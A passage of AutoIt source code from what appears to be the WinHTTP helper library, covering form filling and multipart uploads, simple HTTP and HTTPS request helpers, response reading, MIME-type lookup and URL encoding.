										If StringInStr($schunksub, "--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $spasseddata & @CRLF, 1) Then
											$sadddata = StringRegExpReplace($sadddata, "\Q--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & "\E" & "(.*?)" & @CRLF, "")
											$sadddata = StringReplace($sadddata, "--" & $sboundary & "--" & @CRLF, "", 0, 1)
											$sadddata &= $schunksub & "--" & $sboundary & "--" & @CRLF
											$sradio = StringRegExpReplace($sradio, "\Q--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & "\E(.*?)" & @CRLF & $sgrsep & "?", "")
										EndIf
									Next
									ContinueLoop 2
								ElseIf $ainputids[1][$j] == $asplit[1] AND $ainputids[3][$j] = "checkbox" Then
									$scheckbox = StringRegExpReplace($scheckbox, "\Q--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $spasseddata & @CRLF & "\E" & $sgrsep & "*", "")
									If StringRight($scheckbox, 1) = $sgrsep Then $scheckbox = StringTrimRight($scheckbox, 1)
									ContinueLoop 2
								ElseIf $ainputids[1][$j] == $asplit[1] AND $ainputids[3][$j] = "button" Then
									$sbutton = StringRegExpReplace($sbutton, "\Q--" & $sboundary & @CRLF & $scdisp & $ainputids[1][$j] & '"' & @CRLF & @CRLF & $spasseddata & @CRLF & "\E" & $sgrsep & "*", "")
									If StringRight($sbutton, 1) = $sgrsep Then $sbutton = StringTrimRight($sbutton, 1)
									ContinueLoop 2
								EndIf
							Next
							$sadddata = StringRegExpReplace($sadddata, "(?s)\Q" & $scdisp & $asplit[1] & '"' & "\E\r\n\r\n.*?\r\n", $scdisp & $asplit[1] & '"' & @CRLF & @CRLF & StringReplace($spasseddata, "\", "\\") & @CRLF)
							$inumrepl = @extended
							If $inumrepl > 1 Then
								$sadddata = StringRegExpReplace($sadddata, "(?s)\Q--" & $sboundary & @CRLF & $scdisp & $asplit[1] & '"' & "\E\r\n\r\n.*?\r\n", "", $inumrepl - 1)
							EndIf
						EndIf
					Next
				EndIf
				__winhttpfinalizectrls($ssubmit, $sradio, $scheckbox, $sbutton, $sadddata, $sgrsep)
		EndSwitch
		ExitLoop
	Next
	If $fsend Then
		If $fvarform Then
			$hinternet = _winhttpconnect($hopen, $snewurl)
		Else
			If $snewurl Then
				$hopen = _winhttpqueryoption($hinternet, $winhttp_option_parent_handle)
				_winhttpclosehandle($hinternet)
				$hinternet = _winhttpconnect($hopen, $snewurl)
			EndIf
		EndIf
		Local $hrequest
		If $ischeme = $internet_scheme_https Then
			$hrequest = __winhttpformsend($hinternet, $smethod, $saction, $fmultipart, $sboundary, $sadddata, True, $sadditionalheaders, $scredname, $scredpass, $iignorecerterr)
		Else
			$hrequest = __winhttpformsend($hinternet, $smethod, $saction, $fmultipart, $sboundary, $sadddata, False, $sadditionalheaders, $scredname, $scredpass)
			If _winhttpqueryheaders($hrequest, $winhttp_query_status_code) >= $http_status_bad_request Then
				_winhttpclosehandle($hrequest)
				$hrequest = __winhttpformsend($hinternet, $smethod, $saction, $fmultipart, $sboundary, $sadddata, True, $sadditionalheaders, $scredname, $scredpass, $iignorecerterr)
			EndIf
		EndIf
		Local $vreturned = _winhttpsimplereaddata($hrequest)
		If @error Then
			_winhttpclosehandle($hrequest)
			Return SetError(4, 0, "")
		EndIf
		Local $iscode = _winhttpqueryheaders($hrequest, $winhttp_query_status_code)
		If $iretarr Then
			Local $areturn[3] = [_winhttpqueryheaders($hrequest), $vreturned, _winhttpqueryoption($hrequest, $winhttp_option_url)]
			$vreturned = $areturn
		EndIf
		_winhttpclosehandle($hrequest)
		Return SetExtended($iscode, $vreturned)
	EndIf
	Return SetError(3, 0, "")
EndFunc

Func _winhttpsimpleformfill_setuploadcallback($vcallback = Default, $inumchunks = 100)
	If $inumchunks <= 0 Then $inumchunks = 100
	Local Static $vfunc = Default, $iparts = $inumchunks
	If $vcallback <> Default Then
		$vfunc = $vcallback
		$iparts = Ceiling($inumchunks)
	ElseIf $vcallback = 0 Then
		$vfunc = Default
		$iparts = 1
	EndIf
	Local $aout[2] = [$vfunc, $iparts]
	Return $aout
EndFunc

Func _winhttpsimplereaddata($hrequest, $imode = Default)
	If $imode = Default Then
		$imode = 0
		If __winhttpcharset(_winhttpqueryheaders($hrequest, $winhttp_query_content_type)) = 65001 Then $imode = 1
	Else
		__winhttpdefault($imode, 0)
	EndIf
	If $imode > 2 OR $imode < 0 Then Return SetError(1, 0, "")
	Local $vdata = Binary("")
	If _winhttpquerydataavailable($hrequest) Then
		Do
			$vdata &= _winhttpreaddata($hrequest, 2)
		Until @error
		Switch $imode
			Case 0
				Return BinaryToString($vdata)
			Case 1
				Return BinaryToString($vdata, 4)
			Case Else
				Return $vdata
		EndSwitch
	EndIf
	Return SetError(2, 0, $vdata)
EndFunc

Func _winhttpsimplereaddataasync($hinternet, ByRef $pbuffer, $inumberofbytestoread = Default)
	__winhttpdefault($inumberofbytestoread, 8192)
	Local $vout = _winhttpreaddata($hinternet, 2, $inumberofbytestoread, $pbuffer)
	Return SetError(@error, @extended, $vout)
EndFunc

Func _winhttpsimplerequest($hconnect, $stype = Default, $spath = Default, $sreferrer = Default, $sdta = Default, $sheader = Default, $fgetheaders = Default, $imode = Default, $scredname = Default, $scredpass = Default)
	__winhttpdefault($stype, "GET")
	__winhttpdefault($spath, "")
	__winhttpdefault($sreferrer, $winhttp_no_referer)
	__winhttpdefault($sdta, $winhttp_no_request_data)
	__winhttpdefault($sheader, $winhttp_no_additional_headers)
	__winhttpdefault($fgetheaders, False)
	__winhttpdefault($imode, Default)
	__winhttpdefault($scredname, "")
	__winhttpdefault($scredpass, "")
	If $imode > 2 OR $imode < 0 Then Return SetError(4, 0, 0)
	Local $hrequest = _winhttpsimplesendrequest($hconnect, $stype, $spath, $sreferrer, $sdta, $sheader)
	If @error Then Return SetError(@error, 0, 0)
	__winhttpsetcredentials($hrequest, $sheader, $sdta, $scredname, $scredpass)
	Local $iextended = _winhttpqueryheaders($hrequest, $winhttp_query_status_code)
	If $fgetheaders Then
		Local $adata[3] = [_winhttpqueryheaders($hrequest), _winhttpsimplereaddata($hrequest, $imode), _winhttpqueryoption($hrequest, $winhttp_option_url)]
		_winhttpclosehandle($hrequest)
		Return SetExtended($iextended, $adata)
	EndIf
	Local $soutdata = _winhttpsimplereaddata($hrequest, $imode)
	_winhttpclosehandle($hrequest)
	Return SetExtended($iextended, $soutdata)
EndFunc

Func _winhttpsimplesendrequest($hconnect, $stype = Default, $spath = Default, $sreferrer = Default, $sdta = Default, $sheader = Default)
	__winhttpdefault($stype, "GET")
	__winhttpdefault($spath, "")
	__winhttpdefault($sreferrer, $winhttp_no_referer)
	__winhttpdefault($sdta, $winhttp_no_request_data)
	__winhttpdefault($sheader, $winhttp_no_additional_headers)
	Local $hrequest = _winhttpopenrequest($hconnect, $stype, $spath, Default, $sreferrer)
	If NOT $hrequest Then Return SetError(1, @error, 0)
	If $stype = "POST" AND $sheader = $winhttp_no_additional_headers Then $sheader = "Content-Type: application/x-www-form-urlencoded" & @CRLF
	_winhttpsetoption($hrequest, $winhttp_option_decompression, $winhttp_decompression_flag_all)
	_winhttpsetoption($hrequest, $winhttp_option_unsafe_header_parsing, 1)
	_winhttpsendrequest($hrequest, $sheader, $sdta)
	If @error Then Return SetError(2, 0 * _winhttpclosehandle($hrequest), 0)
	_winhttpreceiveresponse($hrequest)
	If @error Then Return SetError(3, 0 * _winhttpclosehandle($hrequest), 0)
	Return $hrequest
EndFunc

Func _winhttpsimplesendsslrequest($hconnect, $stype = Default, $spath = Default, $sreferrer = Default, $sdta = Default, $sheader = Default, $iignoreallcerterrors = 0)
	__winhttpdefault($stype, "GET")
	__winhttpdefault($spath, "")
	__winhttpdefault($sreferrer, $winhttp_no_referer)
	__winhttpdefault($sdta, $winhttp_no_request_data)
	__winhttpdefault($sheader, $winhttp_no_additional_headers)
	Local $hrequest = _winhttpopenrequest($hconnect, $stype, $spath, Default, $sreferrer, Default, BitOR($winhttp_flag_secure, $winhttp_flag_escape_disable))
	If NOT $hrequest Then Return SetError(1, @error, 0)
	If $iignoreallcerterrors Then _winhttpsetoption($hrequest, $winhttp_option_security_flags, BitOR($security_flag_ignore_unknown_ca, $security_flag_ignore_cert_date_invalid, $security_flag_ignore_cert_cn_invalid, $security_flag_ignore_cert_wrong_usage))
	If $stype = "POST" AND $sheader = $winhttp_no_additional_headers Then $sheader = "Content-Type: application/x-www-form-urlencoded" & @CRLF
	_winhttpsetoption($hrequest, $winhttp_option_decompression, $winhttp_decompression_flag_all)
	_winhttpsetoption($hrequest, $winhttp_option_unsafe_header_parsing, 1)
	_winhttpsendrequest($hrequest, $sheader, $sdta)
	If @error Then Return SetError(2, 0 * _winhttpclosehandle($hrequest), 0)
	_winhttpreceiveresponse($hrequest)
	If @error Then Return SetError(3, 0 * _winhttpclosehandle($hrequest), 0)
	Return $hrequest
EndFunc

Func _winhttpsimplesslrequest($hconnect, $stype = Default, $spath = Default, $sreferrer = Default, $sdta = Default, $sheader = Default, $fgetheaders = Default, $imode = Default, $scredname = Default, $scredpass = Default, $iignorecerterrors = 0)
	__winhttpdefault($stype, "GET")
	__winhttpdefault($spath, "")
	__winhttpdefault($sreferrer, $winhttp_no_referer)
	__winhttpdefault($sdta, $winhttp_no_request_data)
	__winhttpdefault($sheader, $winhttp_no_additional_headers)
	__winhttpdefault($fgetheaders, False)
	__winhttpdefault($imode, Default)
	__winhttpdefault($scredname, "")
	__winhttpdefault($scredpass, "")
	If $imode > 2 OR $imode < 0 Then Return SetError(4, 0, 0)
	Local $hrequest = _winhttpsimplesendsslrequest($hconnect, $stype, $spath, $sreferrer, $sdta, $sheader, $iignorecerterrors)
	If @error Then Return SetError(@error, 0, 0)
	__winhttpsetcredentials($hrequest, $sheader, $sdta, $scredname, $scredpass)
	If $fgetheaders Then
		Local $adata[3] = [_winhttpqueryheaders($hrequest), _winhttpsimplereaddata($hrequest, $imode), _winhttpqueryoption($hrequest, $winhttp_option_url)]
		_winhttpclosehandle($hrequest)
		Return $adata
	EndIf
	Local $soutdata = _winhttpsimplereaddata($hrequest, $imode)
	_winhttpclosehandle($hrequest)
	Return $soutdata
EndFunc

Func _winhttptimefromsystemtime()
	Local $systemtime = DllStructCreate("word Year;" & "word Month;" & "word DayOfWeek;" & "word Day;" & "word Hour;" & "word Minute;" & "word Second;" & "word Milliseconds")
	DllCall("kernel32.dll", "none", "GetSystemTime", "struct*", $systemtime)
	If @error Then Return SetError(1, 0, "")
	Local $ttime = DllStructCreate("wchar[62]")
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpTimeFromSystemTime", "struct*", $systemtime, "struct*", $ttime)
	If @error OR NOT $acall[0] Then Return SetError(2, 0, "")
	Return DllStructGetData($ttime, 1)
EndFunc

Func _winhttptimetosystemtime($shttptime)
	Local $systemtime = DllStructCreate("word Year;" & "word Month;" & "word DayOfWeek;" & "word Day;" & "word Hour;" & "word Minute;" & "word Second;" & "word Milliseconds")
	Local $ttime = DllStructCreate("wchar[62]")
	DllStructSetData($ttime, 1, $shttptime)
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpTimeToSystemTime", "struct*", $ttime, "struct*", $systemtime)
	If @error OR NOT $acall[0] Then Return SetError(2, 0, 0)
	Local $aret[8] = [DllStructGetData($systemtime, "Year"), DllStructGetData($systemtime, "Month"), DllStructGetData($systemtime, "DayOfWeek"), DllStructGetData($systemtime, "Day"), DllStructGetData($systemtime, "Hour"), DllStructGetData($systemtime, "Minute"), DllStructGetData($systemtime, "Second"), DllStructGetData($systemtime, "Milliseconds")]
	Return $aret
EndFunc

Func _winhttpwritedata($hrequest, $vdata, $imode = Default)
	__winhttpdefault($imode, 0)
	Local $inumberofbytestowrite, $tdata
	If $imode = 1 Then
		$inumberofbytestowrite = BinaryLen($vdata)
		$tdata = DllStructCreate("byte[" & $inumberofbytestowrite & "]")
		DllStructSetData($tdata, 1, $vdata)
	ElseIf IsDllStruct($vdata) Then
		$inumberofbytestowrite = DllStructGetSize($vdata)
		$tdata = $vdata
	Else
		$inumberofbytestowrite = StringLen($vdata)
		$tdata = DllStructCreate("char[" & $inumberofbytestowrite + 1 & "]")
		DllStructSetData($tdata, 1, $vdata)
	EndIf
	Local $acall = DllCall($hwinhttpdll__winhttp, "bool", "WinHttpWriteData", "handle", $hrequest, "struct*", $tdata, "dword", $inumberofbytestowrite, "dword*", 0)
	If @error OR NOT $acall[0] Then Return SetError(1, 0, 0)
	Return SetExtended($acall[4], 1)
EndFunc

Func __winhttpfilecontent($saccept, $sname, $sfilestring, $sboundarymain = "")
	#forceref $sAccept
	Local $fnonstandard = False
	If StringLeft($sfilestring, 10) = "PHP#50338:" Then
		$sfilestring = StringTrimLeft($sfilestring, 10)
		$fnonstandard = True
	EndIf
	Local $sout = 'Content-Disposition: form-data; name="' & $sname & '"'
	If NOT $sfilestring Then Return $sout & '; filename=""' & @CRLF & @CRLF & @CRLF
	If StringRight($sfilestring, 1) = "|" Then $sfilestring = StringTrimRight($sfilestring, 1)
	Local $afiles = StringSplit($sfilestring, "|", 2), $hfile
	If UBound($afiles) = 1 Then
		$hfile = FileOpen($afiles[0], 16)
		$sout &= '; filename="' & StringRegExpReplace($afiles[0], ".*\\", "") & '"' & @CRLF & "Content-Type: " & __winhttpmimetype($afiles[0]) & @CRLF & @CRLF & BinaryToString(FileRead($hfile), 1) & @CRLF
		FileClose($hfile)
		Return $sout
	EndIf
	If $fnonstandard Then
		$sout = ""
		Local $ifiles = UBound($afiles)
		For $i = 0 To $ifiles - 1
			$hfile = FileOpen($afiles[$i], 16)
			$sout &= 'Content-Disposition: form-data; name="' & $sname & '"' & '; filename="' & StringRegExpReplace($afiles[$i], ".*\\", "") & '"' & @CRLF & "Content-Type: " & __winhttpmimetype($afiles[$i]) & @CRLF & @CRLF & BinaryToString(FileRead($hfile), 1) & @CRLF
			FileClose($hfile)
			If $i < $ifiles - 1 Then $sout &= "--" & $sboundarymain & @CRLF
		Next
	Else
		Local $sboundary = StringFormat("%s%.5f", "----WinHttpSubBoundaryLine_", Random(10000, 99999))
		$sout &= @CRLF & "Content-Type: multipart/mixed; boundary=" & $sboundary & @CRLF & @CRLF
		For $i = 0 To UBound($afiles) - 1
			$hfile = FileOpen($afiles[$i], 16)
			$sout &= "--" & $sboundary & @CRLF & 'Content-Disposition: file; filename="' & StringRegExpReplace($afiles[$i], ".*\\", "") & '"' & @CRLF & "Content-Type: " & __winhttpmimetype($afiles[$i]) & @CRLF & @CRLF & BinaryToString(FileRead($hfile), 1) & @CRLF
			FileClose($hfile)
		Next
		$sout &= "--" & $sboundary & "--" & @CRLF
	EndIf
	Return $sout
EndFunc

Func __winhttpmimetype($sfilename)
	Local $aarray = StringRegExp(__winhttpmimeassocstring(), "(?i)\Q;" & StringRegExpReplace($sfilename, ".*\.", "") & "\E\|(.*?);", 3)
	If @error Then Return "application/octet-stream"
	Return $aarray[0]
EndFunc

Func __winhttpmimeassocstring()
	Return ";ai|application/postscript;aif|audio/x-aiff;aifc|audio/x-aiff;aiff|audio/x-aiff;asc|text/plain;atom|application/atom+xml;au|audio/basic;avi|video/x-msvideo;bcpio|application/x-bcpio;bin|application/octet-stream;bmp|image/bmp;cdf|application/x-netcdf;cgm|image/cgm;class|application/octet-stream;cpio|application/x-cpio;cpt|application/mac-compactpro;csh|application/x-csh;css|text/css;dcr|application/x-director;dif|video/x-dv;dir|application/x-director;djv|image/vnd.djvu;djvu|image/vnd.djvu;dll|application/octet-stream;dmg|application/octet-stream;dms|application/octet-stream;doc|application/msword;dtd|application/xml-dtd;dv|video/x-dv;dvi|application/x-dvi;dxr|application/x-director;eps|application/postscript;etx|text/x-setext;exe|application/octet-stream;ez|application/andrew-inset;gif|image/gif;gram|application/srgs;grxml|application/srgs+xml;gtar|application/x-gtar;hdf|application/x-hdf;hqx|application/mac-binhex40;htm|text/html;html|text/html;ice|x-conference/x-cooltalk;ico|image/x-icon;ics|text/calendar;ief|image/ief;ifb|text/calendar;iges|model/iges;igs|model/iges;jnlp|application/x-java-jnlp-file;jp2|image/jp2;jpe|image/jpeg;jpeg|image/jpeg;jpg|image/jpeg;js|application/x-javascript;kar|audio/midi;latex|application/x-latex;lha|application/octet-stream;lzh|application/octet-stream;m3u|audio/x-mpegurl;m4a|audio/mp4a-latm;m4b|audio/mp4a-latm;m4p|audio/mp4a-latm;m4u|video/vnd.mpegurl;m4v|video/x-m4v;mac|image/x-macpaint;man|application/x-troff-man;mathml|application/mathml+xml;me|application/x-troff-me;mesh|model/mesh;mid|audio/midi;midi|audio/midi;mif|application/vnd.mif;mov|video/quicktime;movie|video/x-sgi-movie;mp2|audio/mpeg;mp3|audio/mpeg;mp4|video/mp4;mpe|video/mpeg;mpeg|video/mpeg;mpg|video/mpeg;mpga|audio/mpeg;ms|application/x-troff-ms;msh|model/mesh;mxu|video/vnd.mpegurl;nc|application/x-netcdf;oda|application/oda;ogg|application/ogg;pbm|image/x-portable-bitmap;pct|image/pict;pdb|chemical/x-pdb;pdf|application/pdf;pgm|image/x-portable-graymap;pgn|application/x-chess-pgn;pic|image/pict;pict|image/pict;png|image/png;pnm|image/x-portable-anymap;pnt|image/x-macpaint;pntg|image/x-macpaint;ppm|image/x-portable-pixmap;ppt|application/vnd.ms-powerpoint;ps|application/postscript;qt|video/quicktime;qti|image/x-quicktime;qtif|image/x-quicktime;ra|audio/x-pn-realaudio;ram|audio/x-pn-realaudio;ras|image/x-cmu-raster;rdf|application/rdf+xml;rgb|image/x-rgb;rm|application/vnd.rn-realmedia;roff|application/x-troff;rtf|text/rtf;rtx|text/richtext;sgm|text/sgml;sgml|text/sgml;sh|application/x-sh;shar|application/x-shar;silo|model/mesh;sit|application/x-stuffit;skd|application/x-koan;skm|application/x-koan;skp|application/x-koan;skt|application/x-koan;smi|application/smil;smil|application/smil;snd|audio/basic;so|application/octet-stream;spl|application/x-futuresplash;src|application/x-wais-source;sv4cpio|application/x-sv4cpio;sv4crc|application/x-sv4crc;svg|image/svg+xml;swf|application/x-shockwave-flash;t|application/x-troff;tar|application/x-tar;tcl|application/x-tcl;tex|application/x-tex;texi|application/x-texinfo;texinfo|application/x-texinfo;tif|image/tiff;tiff|image/tiff;tr|application/x-troff;tsv|text/tab-separated-values;txt|text/plain;ustar|application/x-ustar;vcd|application/x-cdlink;vrml|model/vrml;vxml|application/voicexml+xml;wav|audio/x-wav;wbmp|image/vnd.wap.wbmp;wbmxl|application/vnd.wap.wbxml;wml|text/vnd.wap.wml;wmlc|application/vnd.wap.wmlc;wmls|text/vnd.wap.wmlscript;wmlsc|application/vnd.wap.wmlscriptc;wrl|model/vrml;xbm|image/x-xbitmap;xht|application/xhtml+xml;xhtml|application/xhtml+xml;xls|application/vnd.ms-excel;xml|application/xml;xpm|image/x-xpixmap;xsl|application/xml;xslt|application/xslt+xml;xul|application/vnd.mozilla.xul+xml;xwd|image/x-xwindowdump;xyz|chemical/x-xyz;zip|application/zip;"
EndFunc

Func __winhttpcharset($scontenttype)
	Local $acontenttype = StringRegExp($scontenttype, "(?i).*?\Qcharset=\E(?U)([^ ]+)(;| |\Z)", 2)
	If NOT @error Then $scontenttype = $acontenttype[1]
	If StringLeft($scontenttype, 2) = "cp" Then Return Int(StringTrimLeft($scontenttype, 2))
	If $scontenttype = "utf-8" Then Return 65001
EndFunc

Func __winhttpurlencode($vdata, $senctype = "")
	If IsBool($vdata) Then Return $vdata
	$vdata = __winhttphtmldecode($vdata)
	If $senctype = "text/plain" Then Return StringReplace($vdata, " ", "+")
	Local $adata = StringToASCIIArray($vdata, Default, Default, 2)
	Local $sout
	For $i = 0 To UBound($adata) - 1
		Switch $adata[$i]
			Case 45, 46, 48 To 57, 65 To 90, 95, 97 To 122, 126
				$sout &= Chr($adata[$i])
			Case 32
				$sout &= "+"
			Case Else
				$sout &= "%" & Hex($adata[$i], 2)
		EndSwitch
	Next
	Return $sout
EndFunc

Func __winhttphtmldecode($vdata)
	Return StringReplace(StringReplace(StringReplace(StringReplace($vdata, "&amp;", "&"), "&lt;", "<"), "&gt;", ">"), "&quot;", '"')
EndFunc

Func __winhttpnormalizeactionurl($sactionpage, ByRef $saction, ByRef $ischeme, ByRef $snewurl, ByRef $senctype, ByRef $smethod, $surl = "")
	Local $acrackurl = _winhttpcrackurl($saction)
	If @error Then
		If $saction Then
			If StringLeft($saction, 2) = "//" Then
				$acrackurl = _winhttpcrackurl($surl)
				If NOT @error Then
					$acrackurl = _winhttpcrackurl($acrackurl[0] & ":" & $saction)
					If NOT @error Then
						$snewurl = $acrackurl[0] & "://" & $acrackurl[2] & ":" & $acrackurl[3]
						$ischeme = $acrackurl[1]
						$saction = $acrackurl[6] & $acrackurl[7]
						$sactionpage = ""
					EndIf
				EndIf
			ElseIf StringLeft($saction, 1) = "?" Then
				$acrackurl = _winhttpcrackurl($surl)
				$saction = $acrackurl[6] & $saction
			ElseIf StringLeft($saction, 1) = "#" Then
				$saction = StringReplace($sactionpage, StringRegExpReplace($sactionpage, "(.*?)(#.*?)", "$2"), $saction)
			ElseIf StringLeft($saction, 1) <> "/" Then
				Local $scurrent
				Local $aurl = StringRegExp($sactionpage, "(.*)/", 3)
				If NOT @error Then $scurrent = $aurl[0]
				If $scurrent Then $saction = $scurrent & "/" & $saction
			EndIf
			If StringLeft($saction, 1) = "?" Then $saction = $sactionpage & $saction
		EndIf
		If NOT $saction Then $saction = $sactionpage
		$saction = StringRegExpReplace($saction, "\A(/*\.\./)*", "")
	Else
		$ischeme = $acrackurl[1]
		$snewurl = $acrackurl[0] & "://" & $acrackurl[2] & ":" & $acrackurl[3]
		$saction = $acrackurl[6] & $acrackurl[7]
	EndIf
	If NOT $smethod Then $smethod = "GET"
	If $smethod = "GET" Then $senctype = ""
EndFunc

Func __winhttphtml5formattribs(ByRef $adtas, ByRef $aflds, ByRef $inumparams, ByRef $ainput, ByRef $saction, ByRef $senctype, ByRef $smethod)
	Local $aspl, $isubmithtml5 = 0, $iinpsubm, $simgappx = "."
	For $k = 1 To $inumparams
		$aspl = StringSplit($aflds[$k], ":", 2)
		If $aspl[0] = "type" AND ($aspl[1] = "submit" OR $aspl[1] = "image") Then
			Local $isubmindex = $adtas[$k], $isubmcur = 0, $iimgcur = 0, $stype, $sinpnme
			If $aspl[1] = "image" Then
				$isubmindex = Int($adtas[$k])
			EndIf
			For $i = 0 To UBound($ainput) - 1
				Switch __winhttpattribval($ainput[$i], "type")
					Case "submit"
						If $isubmcur = $isubmindex Then
							$isubmithtml5 = 1
							$iinpsubm = $i
							ExitLoop 2
						EndIf
						$isubmcur += 1
					Case "image"
						If $iimgcur = $isubmindex Then
							$isubmithtml5 = 1
							$iinpsubm = $i
							$sinpnme = __winhttpattribval($ainput[$iinpsubm], "name")
							If $sinpnme Then $sinpnme &= $simgappx
							$ainput[$iinpsubm] = 'type="image" formaction="' & __winhttpattribval($ainput[$iinpsubm], "formaction") & '" formenctype="' & __winhttpattribval($ainput[$iinpsubm], "formenctype") & '" formmethod="' & __winhttpattribval($ainput[$iinpsubm], "formmethod") & '"'
							Local $ix = 0, $iy = 0
							$ix = Int(StringRegExpReplace($adtas[$k], "(\d+)\h*(\d+),(\d+)", "$2", 1))
							$iy = Int(StringRegExpReplace($adtas[$k], "(\d+)\h*(\d+),(\d+)", "$3", 1))
							ReDim $ainput[UBound($ainput) + 2]
							$ainput[UBound($ainput) - 2] = 'type="image" name="' & $sinpnme & 'x" value="' & $ix & '"'
							$ainput[UBound($ainput) - 1] = 'type="image" name="' & $sinpnme & 'y" value="' & $iy & '"'
							ExitLoop 2
						EndIf
						$iimgcur += 1
				EndSwitch
			Next
		ElseIf $aspl[0] = "name" Then
			Local $sinpnme = $aspl[1], $stype
			For $i = 0 To UBound($ainput) - 1
				$stype = __winhttpattribval($ainput[$i], "type")
				If $stype = "submit" Then
					If __winhttpattribval($ainput[$i], "name") = $sinpnme AND $adtas[$k] = True Then
						$isubmithtml5 = 1
						$iinpsubm = $i
						ExitLoop 2
					EndIf
				ElseIf $stype = "image" Then
					If __winhttpattribval($ainput[$i], "name") = $sinpnme AND $adtas[$k] Then
						$isubmithtml5 = 1
						$iinpsubm = $i
						Local $astrsplit = StringSplit($adtas[$k], ",", 3), $ix = 0, $iy = 0
						If NOT @error Then
							$ix = Int($astrsplit[0])
							$iy = Int($astrsplit[1])
						EndIf
						$ainput[$iinpsubm] = 'type="image" formaction="' & __winhttpattribval($ainput[$iinpsubm], "formaction") & '" formenctype="' & __winhttpattribval($ainput[$iinpsubm], "formenctype") & '" formmethod="' & __winhttpattribval($ainput[$iinpsubm], "formmethod") & '"'
						$sinpnme &= $simgappx
						ReDim $ainput[UBound($ainput) + 2]
						$ainput[UBound($ainput) - 2] = 'type="image" name="' & $sinpnme & 'x" value="' & $ix & '"'
						$ainput[UBound($ainput) - 1] = 'type="image" name="' & $sinpnme & 'y" value="' & $iy & '"'
						ExitLoop 2
					EndIf
				EndIf
			Next
		Else
			Local $sinpid, $stype
			If @error Then
				$sinpid = $aspl[0]
			ElseIf $aspl[0] = "id" Then
				$sinpid = $aspl[1]
			EndIf
			For $i = 0 To UBound($ainput) - 1
				$stype = __winhttpattribval($ainput[$i], "type")
				If $stype = "submit" Then
					If __winhttpattribval($ainput[$i], "id") = $sinpid AND $adtas[$k] = True Then
						$isubmithtml5 = 1
						$iinpsubm = $i
						ExitLoop 2
					EndIf
				ElseIf $stype = "image" Then
					If __winhttpattribval($ainput[$i], "id") = $sinpid AND $adtas[$k] Then
						$isubmithtml5 = 1
						$iinpsubm = $i
						Local $sinpnme = __winhttpattribval($ainput[$iinpsubm], "name")
						If $sinpnme Then $sinpnme &= $simgappx
						Local $astrsplit = StringSplit($adtas[$k], ",", 3), $ix = 0, $iy = 0
						If NOT @error Then
							$ix = Int($astrsplit[0])
							$iy = Int($astrsplit[1])
						EndIf
						$ainput[$iinpsubm] = 'type="image" formaction="' & __winhttpattribval($ainput[$iinpsubm], "formaction") & '" formenctype="' & __winhttpattribval($ainput[$iinpsubm], "formenctype") & '" formmethod="' & __winhttpattribval($ainput[$iinpsubm], "formmethod") & '"'
						ReDim $ainput[UBound($ainput) + 2]
						$ainput[UBound($ainput) - 2] = 'type="image" name="' & $sinpnme & 'x" value="' & $ix & '"'
						$ainput[UBound($ainput) - 1] = 'type="image" name="' & $sinpnme & 'y" value="' & $iy & '"'
						ExitLoop 2
					EndIf
				EndIf
			Next
		EndIf
	Next
	If $isubmithtml5 Then
		Local $iubound = UBound($ainput) - 1
		If __winhttpattribval($ainput[$iinpsubm], "type") = "image" Then $iubound -= 2
		For $j = 0 To $iubound
			If $j = $iinpsubm Then ContinueLoop
			Switch __winhttpattribval($ainput[$j], "type")
				Case "submit", "image"
					$ainput[$j] = ""
			EndSwitch
		Next
		Local $sattr = __winhttpattribval($ainput[$iinpsubm], "formaction")
		If $sattr Then $saction = $sattr
		$sattr = __winhttpattribval($ainput[$iinpsubm], "formenctype")
		If $sattr Then $senctype = $sattr
		$sattr = __winhttpattribval($ainput[$iinpsubm], "formmethod")
		If $sattr Then $smethod = $sattr
		If __winhttpattribval($ainput[$iinpsubm], "type") = "image" Then $ainput[$iinpsubm] = ""
	EndIf
EndFunc

Func __winhttpnormalizeform(ByRef $sform, $sspr1, $sspr2)
	Local $adata = StringToASCIIArray($sform, Default, Default, 2)
	Local $sout, $bquot = False, $bsquot = False, $boptg = True
	For $i = 0 To UBound($adata) - 1
		Switch $adata[$i]
			Case 34
				If $boptg Then $bquot = NOT $bquot
				$sout &= Chr($adata[$i])
			Case 39
				If $boptg Then $bsquot = NOT $bsquot
				$sout &= Chr($adata[$i])
			Case 32
				If $bquot OR $bsquot Then
					$sout &= $sspr1
				Else
					$sout &= Chr($adata[$i])
				EndIf
			Case 60
				If NOT $boptg Then $boptg = True
				$sout &= Chr($adata[$i])
			Case 62
				If $bquot OR $bsquot Then
					$sout &= $sspr2
				Else
					If $boptg Then $boptg = False
					$sout &= Chr($adata[$i])
				EndIf
			Case Else
				$sout &= Chr($adata[$i])
		EndSwitch
	Next
	$sform = $sout
EndFunc

Func __winhttpfinalizectrls($ssubmit, $sradio, $scheckbox, $sbutton, ByRef $sadddata, $sgrsep, $sbound = "")
	If $ssubmit Then
		Local $asubmit = StringSplit($ssubmit, $sgrsep, 3)
		For $m = 1 To UBound($asubmit) - 1
			$sadddata = StringRegExpReplace($sadddata, "(?:\Q" & $sbound & "\E|\A)\Q" & $asubmit[$m] & "\E(?:\Q" & $sbound & "\E|\z)", $sbound)
		Next
		__winhttptrimbounds($sadddata, $sbound)
	EndIf
	If $sradio Then
		If $sradio <> $sgrsep Then
			For $selem In StringSplit($sradio, $sgrsep, 3)
				$sadddata = StringRegExpReplace($sadddata, "(?:\Q" & $sbound & "\E|\A)\Q" & $selem & "\E(?:\Q" & $sbound & "\E|\z)", $sbound)
			Next
			__winhttptrimbounds($sadddata, $sbound)
		EndIf
	EndIf
	If $scheckbox Then
		For $selem In StringSplit($scheckbox, $sgrsep, 3)
			$sadddata = StringRegExpReplace($sadddata, "(?:\Q" & $sbound & "\E|\A)\Q" & $selem & "\E(?:\Q" & $sbound & "\E|\z)", $sbound)
		Next
		__winhttptrimbounds($sadddata, $sbound)
	EndIf
	If $sbutton Then
		For $selem In StringSplit($sbutton, $sgrsep, 3)
			$sadddata = StringRegExpReplace($sadddata, "(?:\Q" & $sbound & "\E|\A)\Q" & $selem & "\E(?:\Q" & $sbound & "\E|\z)", $sbound)
		Next
		__winhttptrimbounds($sadddata, $sbound)
